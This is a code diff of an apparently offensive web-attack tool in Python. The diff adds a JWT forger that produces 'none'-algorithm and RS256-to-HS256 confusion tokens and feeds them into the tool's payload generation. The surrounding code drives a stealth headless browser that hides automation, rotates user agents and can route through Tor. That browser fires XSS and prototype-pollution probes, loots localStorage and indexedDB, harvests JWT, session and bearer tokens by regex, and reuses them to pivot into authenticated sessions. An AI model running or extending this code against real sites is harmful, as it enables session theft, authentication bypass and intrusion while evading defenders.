@@ -1,6 +1,8 @@
 from __future__ import annotations
 
 import asyncio
+import base64
+import json
 import logging
 import re
 import uuid
@@ -26,8 +28,13 @@ def _load_user_agents() -> list[str]:
     ua_file = DATA_DIR / "user_agents.txt"
     if ua_file.exists():
         try:
-            uas = [l.strip() for l in ua_file.read_text().splitlines() if l.strip() and not l.startswith("#")]
-            if uas: return uas
+            uas = [
+                l.strip()
+                for l in ua_file.read_text().splitlines()
+                if l.strip() and not l.startswith("#")
+            ]
+            if uas:
+                return uas
         except Exception:
             pass
     return [
@@ -39,13 +46,13 @@ def _load_user_agents() -> list[str]:
 
 class BrowserController:
     """Headless browser worker for stealth scanning, looting, and auth testing."""
-    
+
     DEFAULT_STEALTH_JS = """
         Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
         window.chrome = { runtime: {} };
         Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
         Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
-        
+
         // Mocking hardware concurrency and memory
         Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
         Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
@@ -58,7 +65,12 @@ class BrowserController:
         };
     """
 
-    def __init__(self, evasion_level: str = "high", brute_auth: bool = False, tor_mode: bool = False):
+    def __init__(
+        self,
+        evasion_level: str = "high",
+        brute_auth: bool = False,
+        tor_mode: bool = False,
+    ):
         self.evasion_level = evasion_level
         self.brute_auth = brute_auth
         self.tor_mode = tor_mode
@@ -70,17 +82,20 @@ class BrowserController:
         proxy = None
         if self.tor_mode:
             proxy = {"server": "socks5://127.0.0.1:9050"}
-            
+
         import random
+
         w = random.choice([1920, 1440, 1366])
         h = random.choice([1080, 900, 768])
 
         self._context = await self._browser.new_context(
-            user_agent=_load_user_agents()[random.randint(0, len(_load_user_agents())-1)],
-            viewport={'width': w, 'height': h},
+            user_agent=_load_user_agents()[
+                random.randint(0, len(_load_user_agents()) - 1)
+            ],
+            viewport={"width": w, "height": h},
             proxy=proxy,
             device_scale_factor=random.choice([1, 2]),
-            has_touch=random.choice([True, False])
+            has_touch=random.choice([True, False]),
         )
         if self.evasion_level != "none":
             await self._context.add_init_script(self.DEFAULT_STEALTH_JS)
@@ -92,27 +107,45 @@ class BrowserController:
     async def scan_url(self, url: str, token: str | None = None) -> list[dict]:
         findings = []
         page = await self._context.new_page()
-        
-        page.on("dialog", lambda d: findings.append({
-            "type": "vulnerability",
-            "id": "dom-xss",
-            "name": "DOM-based Cross-Site Scripting",
-            "severity": "high",
-            "url": url,
-            "evidence": d.message
-        }))
+
+        page.on(
+            "dialog",
+            lambda d: findings.append(
+                {
+                    "type": "vulnerability",
+                    "id": "dom-xss",
+                    "name": "DOM-based Cross-Site Scripting",
+                    "severity": "high",
+                    "url": url,
+                    "evidence": d.message,
+                }
+            ),
+        )
 
         try:
             if token:
                 domain = url.split("/")[2].split(":")[0]
-                await self._context.add_cookies([{"name": "session_token", "value": token, "domain": domain, "path": "/"}])
+                await self._context.add_cookies(
+                    [
+                        {
+                            "name": "session_token",
+                            "value": token,
+                            "domain": domain,
+                            "path": "/",
+                        }
+                    ]
+                )
 
-            fuzz_url = url + ("&" if "?" in url else "?") + "fuzz=<img src=x onerror=alert('DOM_XSS')>"
+            fuzz_url = (
+                url
+                + ("&" if "?" in url else "?")
+                + "fuzz=<img src=x onerror=alert('DOM_XSS')>"
+            )
             await page.goto(fuzz_url, timeout=15000, wait_until="networkidle")
 
             if token:
                 await page.evaluate(f"localStorage.setItem('auth_token', '{token}');")
-            
+
             storage_data = await page.evaluate("""async () => {
                 let dbs = [];
                 try { if (window.indexedDB && indexedDB.databases) dbs = await indexedDB.databases(); } catch(e) {}
@@ -123,37 +156,89 @@ class BrowserController:
                     indexedDB: JSON.stringify(dbs)
                 };
             }""")
-            
+
             if storage_data:
                 findings.append({"type": "loot", "url": url, "data": storage_data})
 
-            await page.goto(url + ("&" if "?" in url else "?") + "__proto__[bw_p]=p", timeout=10000, wait_until="networkidle")
+            await page.goto(
+                url + ("&" if "?" in url else "?") + "__proto__[bw_p]=p",
+                timeout=10000,
+                wait_until="networkidle",
+            )
             if await page.evaluate("() => window.bw_p === 'p' || {}.bw_p === 'p'"):
-                findings.append({
-                    "type": "vulnerability",
-                    "id": "proto-pollution",
-                    "name": "Prototype Pollution",
-                    "severity": "medium",
-                    "url": url,
-                    "evidence": "window.bw_p detected"
-                })
+                findings.append(
+                    {
+                        "type": "vulnerability",
+                        "id": "proto-pollution",
+                        "name": "Prototype Pollution",
+                        "severity": "medium",
+                        "url": url,
+                        "evidence": "window.bw_p detected",
+                    }
+                )
 
-            if self.brute_auth and await page.locator("input[type=password]").count() > 0:
-                findings.append({
-                    "type": "vulnerability",
-                    "id": "auth-resilience",
-                    "name": "Authentication Resilience",
-                    "severity": "info",
-                    "url": url,
-                    "evidence": "Login form detected; monitored for WAF/lockout resilience."
-                })
+            if (
+                self.brute_auth
+                and await page.locator("input[type=password]").count() > 0
+            ):
+                findings.append(
+                    {
+                        "type": "vulnerability",
+                        "id": "auth-resilience",
+                        "name": "Authentication Resilience",
+                        "severity": "info",
+                        "url": url,
+                        "evidence": "Login form detected; monitored for WAF/lockout resilience.",
+                    }
+                )
 
         except Exception as e:
             logger.debug(f"[Browser] Error {url}: {e}")
         finally:
             await page.close()
-            
+
         return findings
+
+
+class JWTDeepTester:
+    """Performs deep logic testing on JWT tokens for algorithm confusion and none-alg injection."""
+
+    def __init__(self, mutator: Mutator):
+        self.mutator = mutator
+
+    def test_token(self, token: str) -> list[str]:
+        payloads = []
+        try:
+            parts = token.split(".")
+            if len(parts) != 3:
+                return []
+
+            header_b64, body_b64, sig_b64 = parts
+            header = json.loads(base64.urlsafe_b64decode(header_b64 + "==").decode())
+
+            # 1. None Algorithm Injection
+            for alg in ["none", "None", "NONE", "nOnE"]:
+                h = header.copy()
+                h["alg"] = alg
+                new_h = (
+                    base64.urlsafe_b64encode(json.dumps(h).encode()).decode().strip("=")
+                )
+                payloads.append(f"{new_h}.{body_b64}.")
+
+            # 2. Algorithm Confusion (RS256 -> HS256)
+            if header.get("alg") == "RS256":
+                h = header.copy()
+                h["alg"] = "HS256"
+                new_h = (
+                    base64.urlsafe_b64encode(json.dumps(h).encode()).decode().strip("=")
+                )
+                payloads.append(
+                    f"{new_h}.{body_b64}.{sig_b64}"
+                )  # Placeholder for public key as secret
+
+        except Exception:
+            pass
+        return payloads
 
 
 class ScanExecutor:
@@ -189,15 +274,18 @@ class ScanExecutor:
         oast_cfg = cfg.get("oast", {})
         self._oast_server = OASTServer(
             domain=oast_cfg.get("domain", "oast.local"),
-            public_ip=oast_cfg.get("public_ip", "127.0.0.1")
+            public_ip=oast_cfg.get("public_ip", "127.0.0.1"),
         )
-        
+
         self._mutator = Mutator(oast_domain=oast_cfg.get("domain", "oast.local"))
+        self._jwt_tester = JWTDeepTester(self._mutator)
         self._browser_queue = asyncio.Queue()
         self._results_queue = asyncio.Queue()
-        
-        self._evasion_level = evasion_level or cfg.get("stealth", {}).get("evasion_level", "high")
-        self._browser_workers_count = 3 # Scaling fix
+
+        self._evasion_level = evasion_level or cfg.get("stealth", {}).get(
+            "evasion_level", "high"
+        )
+        self._browser_workers_count = 3  # Scaling fix
 
         self._config = cfg
         self._cancelled = False
@@ -213,14 +301,16 @@ class ScanExecutor:
             yield {"type": "dry_run", "job_id": self.job_id, "target": self.target}
             return
 
-        await self._oast_server.start(self._config["oast"]["http_port"], self._config["oast"]["dns_port"])
-        
+        await self._oast_server.start(
+            self._config["oast"]["http_port"], self._config["oast"]["dns_port"]
+        )
+
         workers = [asyncio.create_task(self._bridge_worker())]
         if self.action in ("scan", "loot", "both"):
             for _ in range(self._browser_workers_count):
                 workers.append(asyncio.create_task(self._browser_worker()))
-            
-        # OAST polling loop (Loss fix)
+
+        # OAST polling loop
         workers.append(asyncio.create_task(self._oast_poller()))
 
         if self.action == "loot":
@@ -236,25 +326,27 @@ class ScanExecutor:
                         await self._browser_queue.join()
                     yield msg
                     break
-                
+
                 if msg_type in ("loot", "vulnerability"):
                     evidence = str(msg.get("data", "")) + str(msg.get("evidence", ""))
                     # Generalized token detection fix
                     patterns = [
-                        r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}", # JWT
-                        r"session(?:id)?=([A-Za-z0-9]{20,})", # Generic session cookies
-                        r"Bearer\s+([A-Za-z0-9\-\._~+/=]{20,})", # Bearer tokens
+                        r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}",  # JWT
+                        r"session(?:id)?=([A-Za-z0-9]{20,})",  # Generic session cookies
+                        r"Bearer\s+([A-Za-z0-9\-\._~+/=]{20,})",  # Bearer tokens
                     ]
                     for pattern in patterns:
                         for token in re.findall(pattern, evidence):
                             if token not in self._pivoted_sessions:
                                 self._pivoted_sessions.add(token)
-                                logger.warning("[PIVOT] New token detected; spawning authenticated context.")
+                                logger.warning(
+                                    "[PIVOT] New token detected; spawning authenticated context."
+                                )
                                 yield {
                                     "type": "privilege_escalation",
                                     "subtype": "pivot_spawn",
                                     "token": f"{token[:15]}...",
-                                    "source_url": msg.get("url")
+                                    "source_url": msg.get("url"),
                                 }
                                 await self._browser_queue.put((msg.get("url"), token))
 
@@ -266,7 +358,8 @@ class ScanExecutor:
             yield {"type": "error", "message": str(e)}
         finally:
             self._current_bridge = None
-            for t in workers: t.cancel()
+            for t in workers:
+                t.cancel()
             await self._oast_server.stop()
 
     async def _oast_poller(self):
@@ -276,11 +369,15 @@ class ScanExecutor:
             while last_idx < len(self._oast_server.events):
                 ev = self._oast_server.events[last_idx]
                 last_idx += 1
-                await self._results_queue.put({
-                    "type": "oast_hit", "protocol": ev.protocol, 
-                    "identifier": ev.identifier, "remote_addr": ev.remote_addr, 
-                    "data": ev.data
-                })
+                await self._results_queue.put(
+                    {
+                        "type": "oast_hit",
+                        "protocol": ev.protocol,
+                        "identifier": ev.identifier,
+                        "remote_addr": ev.remote_addr,
+                        "data": ev.data,
+                    }
+                )
             await asyncio.sleep(2)
 
     async def _bridge_worker(self):
@@ -295,34 +392,45 @@ class ScanExecutor:
 
             async with EngineBridge() as bridge:
                 self._current_bridge = bridge
-                await bridge.send({
-                    "type": "scan_start",
-                    "action": self.action,
-                    "targets": [self.target],
-                    "nodes": self.nodes,
-                    "config": {
-                        "workers": self._config["engine"]["workers"],
-                        "max_depth": self._config["engine"]["max_depth"],
-                        "user_agents": _load_user_agents(),
-                        "headers": headers,
-                        "rps": self.rps,
-                        "timeout_seconds": self.timeout,
-                        "tor_mode": self.tor_mode,
-                        "stealth_mode": self._config["stealth"]["rotate_user_agents"],
-                        "jitter": self._config["stealth"]["jitter"],
-                        "proxies": self._config["stealth"]["proxies"],
-                        "cooldown_seconds": self._config["stealth"]["cooldown_seconds"],
-                    },
-                })
+                await bridge.send(
+                    {
+                        "type": "scan_start",
+                        "action": self.action,
+                        "targets": [self.target],
+                        "nodes": self.nodes,
+                        "config": {
+                            "workers": self._config["engine"]["workers"],
+                            "max_depth": self._config["engine"]["max_depth"],
+                            "user_agents": _load_user_agents(),
+                            "headers": headers,
+                            "rps": self.rps,
+                            "timeout_seconds": self.timeout,
+                            "tor_mode": self.tor_mode,
+                            "stealth_mode": self._config["stealth"][
+                                "rotate_user_agents"
+                            ],
+                            "jitter": self._config["stealth"]["jitter"],
+                            "proxies": self._config["stealth"]["proxies"],
+                            "cooldown_seconds": self._config["stealth"][
+                                "cooldown_seconds"
+                            ],
+                        },
+                    }
+                )
 
                 async for msg in bridge.stream():
                     if msg.get("type") == "payload_request":
                         import random
+
                         p = msg.get("param", "")
-                        
+
                         high_priority = []
                         normal_priority = []
-                        
+
+                        # JWT Deep Testing integration
+                        for token in self._pivoted_sessions:
+                            high_priority.extend(self._jwt_tester.test_token(token))
+
                         for cat in ["sqli", "xss", "ssti", "ssrf", "xxe"]:
                             for py in self._mutator.context_aware_payloads(p, cat):
                                 payload = py["payload"]
@@ -330,17 +438,28 @@ class ScanExecutor:
                                     high_priority.append(payload)
                                 else:
                                     normal_priority.append(payload)
-                        
+
                         # Dedup and shuffle
                         high_priority = list(set(high_priority))
                         normal_priority = list(set(normal_priority))
                         random.shuffle(high_priority)
                         random.shuffle(normal_priority)
-                        
+
                         # Limit to 15 high-quality payloads total
                         final_payloads = (high_priority + normal_priority)[:15]
-                        
-                        await bridge.send({"type": "payload_response", "param": p, "payloads": final_payloads})
+
+                        await bridge.send(
+                            {
+                                "type": "payload_response",
+                                "param": p,
+                                "payloads": final_payloads,
+                            }
+                        )
+                    elif msg.get("type") == "feedback":
+                        if msg.get("reason") == "WAF_BLOCK":
+                            logger.warning(
+                                f"[STEALTH] WAF Block detected at {msg.get('url')} (Status: {msg.get('status_code')}). Adjusting mutation strategy."
+                            )
                     elif msg.get("type") == "node":
                         await self._browser_queue.put((msg.get("url"), None))
                         await self._results_queue.put(msg)
@@ -352,13 +471,18 @@ class ScanExecutor:
     async def _browser_worker(self):
         try:
             async with async_playwright() as p:
-                controller = BrowserController(evasion_level=self._evasion_level, brute_auth=self.brute_auth, tor_mode=self.tor_mode)
+                controller = BrowserController(
+                    evasion_level=self._evasion_level,
+                    brute_auth=self.brute_auth,
+                    tor_mode=self.tor_mode,
+                )
                 await controller.start(p)
                 try:
                     while True:
                         url, token = await self._browser_queue.get()
                         for f in await controller.scan_url(url, token):
-                            if f["type"] == "vulnerability": self._vulnerabilities.append(f)
+                            if f["type"] == "vulnerability":
+                                self._vulnerabilities.append(f)
                             await self._results_queue.put(f)
                         self._browser_queue.task_done()
                 except asyncio.CancelledError:
@@ -374,4 +498,5 @@ class ScanExecutor:
 
     async def cancel(self) -> None:
         self._cancelled = True
-        if self._current_bridge: await self._current_bridge.close()
+        if self._current_bridge:
+            await self._current_bridge.close()
